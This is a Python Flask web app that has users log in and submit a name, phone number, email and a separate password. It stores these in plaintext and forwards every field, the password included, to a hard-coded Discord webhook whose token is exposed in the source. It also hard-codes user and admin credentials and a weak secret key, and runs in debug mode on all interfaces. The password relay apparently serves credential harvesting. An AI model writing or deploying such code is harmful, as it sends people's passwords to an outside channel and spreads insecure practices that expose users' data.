import os
import sqlite3
import logging
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect
import requests

app = Flask(__name__)

# SECRET KEY
app.secret_key = "mysecretkey"

# DATABASE PATH
DB_PATH = 'database/users.db'

# DISCORD WEBHOOK
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1505132221617672363/scjAX58UwKiW8Shz1TIllJx9RY1DhbfcdNBFQvYFq5M3X3DF3_93XquVEB9xWisxvIj5'

# LOGS
os.makedirs('logs', exist_ok=True)

logging.basicConfig(
    filename='logs/bot_logs.txt',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)

# DATABASE CONNECTION
def get_db():

    os.makedirs('database', exist_ok=True)

    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    return conn

# DATABASE INIT
def init_db():

    conn = get_db()

    cursor = conn.cursor()

    # USERS TABLE
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users_credentials (
        username TEXT PRIMARY KEY,
        password TEXT NOT NULL
    )
    ''')

    # REQUEST TABLE
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS submitted_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        name TEXT,
        mobile TEXT,
        email TEXT,
        form_password TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    ''')

    # DEFAULT USER
    cursor.execute(
        "INSERT OR IGNORE INTO users_credentials (username, password) VALUES (?, ?)",
        ('user1', 'pass123')
    )

    conn.commit()
    conn.close()

    logging.info("Database Ready")

# DISCORD FUNCTION
def send_to_discord(username, name, mobile, email, form_pass):

    payload = {
        "embeds": [{
            "title": "📩 New User Request",
            "color": 5814783,
            "fields": [

                {
                    "name": "👤 Username",
                    "value": username,
                    "inline": True
                },

                {
                    "name": "📝 Name",
                    "value": name,
                    "inline": True
                },

                {
                    "name": "📱 Mobile",
                    "value": mobile,
                    "inline": True
                },

                {
                    "name": "📧 Email",
                    "value": email,
                    "inline": True
                },

                {
                    "name": "🔑 Password",
                    "value": form_pass,
                    "inline": True
                },

                {
                    "name": "⏰ Time",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": False
                }

            ]
        }]
    }

    try:

        requests.post(DISCORD_WEBHOOK_URL, json=payload)

        logging.info("Discord Notification Sent")

    except Exception as e:

        logging.error(f"Discord Error: {e}")

# USER PANEL
@app.route('/')
def home():

    return render_template(
        'index.html',
        username=session.get('username')
    )

# ADMIN PANEL
@app.route('/admin')
def admin():

    return render_template(
        'admin.html',
        admin='admin' in session
    )

# USER LOGIN
@app.route('/api/login', methods=['POST'])
def api_login():

    try:

        data = request.get_json()

        username = data.get('username')
        password = data.get('password')

        conn = get_db()

        user = conn.execute(
            'SELECT * FROM users_credentials WHERE username=? AND password=?',
            (username, password)
        ).fetchone()

        conn.close()

        if user:

            session['username'] = username

            logging.info(f"Login Success: {username}")

            return jsonify({
                'success': True,
                'message': 'Login Success'
            })

        return jsonify({
            'success': False,
            'message': 'Invalid Username or Password'
        })

    except Exception as e:

        logging.error(f"Login Error: {e}")

        return jsonify({
            'success': False,
            'message': 'Server Error'
        })

# FORM SUBMIT
@app.route('/api/submit', methods=['POST'])
def api_submit():

    try:

        if 'username' not in session:

            return jsonify({
                'success': False,
                'message': 'Login First'
            })

        data = request.get_json()

        name = data.get('name')
        mobile = data.get('mobile')
        email = data.get('email')
        form_password = data.get('form_password')

        conn = get_db()

        conn.execute(
            '''
            INSERT INTO submitted_requests
            (username, name, mobile, email, form_password)
            VALUES (?, ?, ?, ?, ?)
            ''',
            (
                session['username'],
                name,
                mobile,
                email,
                form_password
            )
        )

        conn.commit()
        conn.close()

        # DISCORD SEND
        send_to_discord(
            session['username'],
            name,
            mobile,
            email,
            form_password
        )

        logging.info(f"Form Submitted: {session['username']}")

        return jsonify({
            'success': True,
            'message': 'Request Submitted Successfully'
        })

    except Exception as e:

        logging.error(f"Submit Error: {e}")

        return jsonify({
            'success': False,
            'message': 'Server Error'
        })

# USER MAILBOX
@app.route('/api/mailbox')
def api_mailbox():

    try:

        if 'username' not in session:

            return jsonify([])

        conn = get_db()

        data = conn.execute(
            '''
            SELECT * FROM submitted_requests
            WHERE username=?
            ORDER BY timestamp DESC
            ''',
            (session['username'],)
        ).fetchall()

        conn.close()

        return jsonify([dict(row) for row in data])

    except Exception as e:

        logging.error(f"Mailbox Error: {e}")

        return jsonify([])

# ADMIN LOGIN
@app.route('/api/admin/login', methods=['POST'])
def api_admin_login():

    try:

        data = request.get_json()

        if (
            data.get('username') == 'admin'
            and
            data.get('password') == 'admin123'
        ):

            session['admin'] = True

            logging.info("Admin Login Success")

            return jsonify({
                'success': True
            })

        return jsonify({
            'success': False
        })

    except Exception as e:

        logging.error(f"Admin Login Error: {e}")

        return jsonify({
            'success': False
        })

# ADMIN DATA
@app.route('/api/admin/data')
def api_admin_data():

    try:

        if 'admin' not in session:

            return jsonify({
                'error': 'Unauthorized'
            })

        conn = get_db()

        users = conn.execute(
            'SELECT * FROM users_credentials'
        ).fetchall()

        requests_data = conn.execute(
            '''
            SELECT * FROM submitted_requests
            ORDER BY timestamp DESC
            '''
        ).fetchall()

        conn.close()

        return jsonify({
            'users': [dict(u) for u in users],
            'requests': [dict(r) for r in requests_data]
        })

    except Exception as e:

        logging.error(f"Admin Data Error: {e}")

        return jsonify({
            'error': 'Server Error'
        })

# LOGOUT
@app.route('/logout')
def logout():

    session.pop('username', None)
    session.pop('admin', None)

    return redirect('/')

# START APP
if __name__ == '__main__':

    init_db()

    app.run(
        debug=True,
        host='0.0.0.0',
        port=5000
    )
